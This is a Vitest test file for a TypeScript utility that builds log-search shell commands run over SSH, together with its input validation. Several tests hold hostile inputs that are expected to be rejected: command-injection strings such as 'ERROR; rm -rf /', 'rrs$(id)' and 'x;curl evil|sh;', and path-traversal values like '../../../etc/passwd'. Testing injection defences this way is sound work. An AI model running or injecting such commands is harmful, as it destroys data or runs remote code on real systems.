import { describe, it, expect, vi, beforeEach } from "vitest";
import type { ServerEntry } from "@nrs/auth";

// Mock the SSH layer so searchLogs tests exercise only the stdout/stderr
// selection logic, not a real connection. vi.hoisted keeps the mock fn
// available inside the hoisted vi.mock factory.
const { sshExecMock } = vi.hoisted(() => ({ sshExecMock: vi.fn() }));
vi.mock("../../ssh-client.js", () => ({ sshExec: sshExecMock }));

import {
  buildLogSearchCommand,
  buildHttpdLogSearchCommand,
  searchLogs,
} from "../../commands/log-search.js";

describe("buildLogSearchCommand", () => {
  it("builds grep for current app log (no date)", () => {
    const cmd = buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "RRS", component: "rrs-api",
      pattern: "ERROR", logType: "app",
      maxLines: 100, contextLines: 0,
    });
    expect(cmd).toContain("grep");
    expect(cmd).toContain("ERROR");
    expect(cmd).toContain("/apps_ux/logs/RRS/rrs-api");
    expect(cmd).toContain("rrs-api.log");
    expect(cmd).toContain("tail -100");
  });

  it("builds zgrep for dated gz log", () => {
    const cmd = buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "RRS", component: "rrs-api",
      pattern: "ORA-", logType: "app",
      date: "2026-03-10",
      maxLines: 50, contextLines: 0,
    });
    expect(cmd).toContain("zgrep");
    expect(cmd).toContain("2026-03-10");
  });

  it("uses catalina log prefix for catalina type", () => {
    const cmd = buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "RRS", component: "rrs-api",
      pattern: "Exception", logType: "catalina",
      maxLines: 100, contextLines: 0,
    });
    expect(cmd).toContain("catalina");
  });

  it("adds -C context flag when contextLines > 0", () => {
    const cmd = buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "RRS", component: "rrs-api",
      pattern: "ERROR", logType: "app",
      maxLines: 100, contextLines: 3,
    });
    expect(cmd).toContain("-C 3");
  });

  it("rejects pattern with shell metacharacters", () => {
    expect(() => buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "RRS", component: "rrs-api",
      pattern: "ERROR; rm -rf /", logType: "app",
      maxLines: 100, contextLines: 0,
    })).toThrow();
  });

  it("rejects app or component with shell metacharacters or path traversal", () => {
    const bad = ["x;curl evil|sh;", "a b", "../../etc", "app/../..", "rrs$(id)"];
    for (const value of bad) {
      expect(() => buildLogSearchCommand({
        logsBase: "/apps_ux/logs",
        app: value, component: "rrs-api",
        pattern: "ERROR", logType: "app",
        maxLines: 100, contextLines: 0,
      })).toThrow(/invalid characters/);
      expect(() => buildLogSearchCommand({
        logsBase: "/apps_ux/logs",
        app: "RRS", component: value,
        pattern: "ERROR", logType: "app",
        maxLines: 100, contextLines: 0,
      })).toThrow(/invalid characters/);
    }
  });

  it("accepts legitimate dotted/dashed app and component names", () => {
    expect(() => buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "RAR2", component: "dms-document-api",
      pattern: "ERROR", logType: "app",
      maxLines: 100, contextLines: 0,
    })).not.toThrow();
  });

  it("falls back to app-log discovery (excluding Tomcat logs) when <component>.log is absent", () => {
    // FTA's app log is APP-FTA.log, not fta.log. The fallback must list *.log
    // and exclude catalina/localhost/host-manager/manager/gc so it finds the
    // real app log instead of the (non-existent) conventional name.
    const cmd = buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "FTA", component: "fta",
      pattern: "ERROR", logType: "app",
      maxLines: 100, contextLines: 0,
    });
    // Fast path still tries the conventional name first.
    expect(cmd).toContain("if [ -f /apps_ux/logs/FTA/fta/fta.log ]");
    // Fallback discovers any *.log, minus Tomcat's own logs.
    expect(cmd).toContain("ls -t /apps_ux/logs/FTA/fta/*.log");
    expect(cmd).toContain("grep -vE '/(catalina|localhost|host-manager|manager|gc)[._-]'");
  });

  it("keeps the fixed prefix glob for catalina (does not broaden discovery)", () => {
    const cmd = buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "FTA", component: "fta",
      pattern: "Exception", logType: "catalina",
      maxLines: 100, contextLines: 0,
    });
    expect(cmd).toContain("ls -t /apps_ux/logs/FTA/fta/catalina*.log");
    expect(cmd).not.toContain("grep -vE");
  });
});

describe("buildHttpdLogSearchCommand", () => {
  const base = {
    logsBase: "/sw_ux/httpd01/logs",
    domain: "portalext.example.gov.bc.ca",
    logType: "access" as const,
    pattern: "POST /api",
    maxLines: 100,
    contextLines: 0,
  };

  it("builds grep targeting hot subdir by default", () => {
    const cmd = buildHttpdLogSearchCommand(base);
    expect(cmd).toContain("/sw_ux/httpd01/logs/hot/");
    expect(cmd).toContain("portalext.example.gov.bc.ca-access");
    expect(cmd).toContain("POST /api");
    expect(cmd).toContain("tail -100");
  });

  it("targets cold subdir when specified", () => {
    const cmd = buildHttpdLogSearchCommand({ ...base, subdir: "cold" });
    expect(cmd).toContain("/sw_ux/httpd01/logs/cold/");
  });

  it("converts YYYY-MM-DD date to YYYY.MM.DD in filename", () => {
    const cmd = buildHttpdLogSearchCommand({ ...base, date: "2026-03-18" });
    expect(cmd).toContain("portalext.example.gov.bc.ca-access.2026.03.18.log");
    expect(cmd).not.toContain("2026-03-18");
  });

  it("handles 'today' date with dynamic date command", () => {
    const cmd = buildHttpdLogSearchCommand({ ...base, date: "today" });
    expect(cmd).toContain("$(date +%Y.%m.%d)");
  });

  it("searches newest file when no date specified", () => {
    const cmd = buildHttpdLogSearchCommand(base);
    expect(cmd).toContain("ls -t");
    expect(cmd).toContain("head -1");
  });

  it("builds error log filename", () => {
    const cmd = buildHttpdLogSearchCommand({ ...base, logType: "error", date: "2026-03-18" });
    expect(cmd).toContain("portalext.example.gov.bc.ca-error.2026.03.18.log");
  });

  it("supports date range with dateFrom/dateTo", () => {
    const cmd = buildHttpdLogSearchCommand({
      ...base,
      dateFrom: "2026-03-15",
      dateTo: "2026-03-18",
    });
    expect(cmd).toContain("2026-03-15");
    expect(cmd).toContain("2026-03-18");
    expect(cmd).toContain("tr '-' '.'");
  });

  it("adds -C context flag when contextLines > 0", () => {
    const cmd = buildHttpdLogSearchCommand({ ...base, contextLines: 5 });
    expect(cmd).toContain("-C 5");
  });

  it("rejects pattern with shell metacharacters", () => {
    expect(() => buildHttpdLogSearchCommand({
      ...base, pattern: "POST; rm -rf /",
    })).toThrow("shell metacharacters");
  });

  it("rejects domain with path traversal characters", () => {
    expect(() => buildHttpdLogSearchCommand({
      ...base, domain: "../../../etc/passwd",
    })).toThrow("invalid characters");
  });

  it("accepts 'default' as a valid domain", () => {
    const cmd = buildHttpdLogSearchCommand({ ...base, domain: "default" });
    expect(cmd).toContain("default-access");
  });
});

describe("searchLogs (stdout/stderr selection)", () => {
  const entry = { logsBase: "/apps_ux/logs" } as unknown as ServerEntry;
  const params = {
    app: "RRS", component: "rrs-api",
    pattern: "ERROR", logType: "app" as const,
    maxLines: 100, contextLines: 0,
  };

  beforeEach(() => {
    sshExecMock.mockReset();
  });

  it("returns stdout when matches are found", async () => {
    sshExecMock.mockResolvedValue({ stdout: "42: ERROR boom", stderr: "", exitCode: 0 });
    const { output, exitCode } = await searchLogs(entry, params);
    expect(output).toBe("42: ERROR boom");
    expect(exitCode).toBe(0);
  });

  it("returns a clean message on zero matches (empty stdout and stderr)", async () => {
    sshExecMock.mockResolvedValue({ stdout: "", stderr: "", exitCode: 0 });
    const { output } = await searchLogs(entry, params);
    expect(output).toBe("No matching lines found.");
  });

  it("surfaces a genuine error from stderr when stdout is empty", async () => {
    sshExecMock.mockResolvedValue({
      stdout: "",
      stderr: "SERVER_A_PASSWORD not set. Add it to ~/.raven/.env.",
      exitCode: 1,
    });
    const { output, exitCode } = await searchLogs(entry, params);
    expect(output).toContain("SERVER_A_PASSWORD not set");
    expect(exitCode).toBe(1);
  });

  it("prefers stdout over stderr when both are present", async () => {
    sshExecMock.mockResolvedValue({
      stdout: "12: matched",
      stderr: "some warning noise",
      exitCode: 0,
    });
    const { output } = await searchLogs(entry, params);
    expect(output).toBe("12: matched");
  });
});
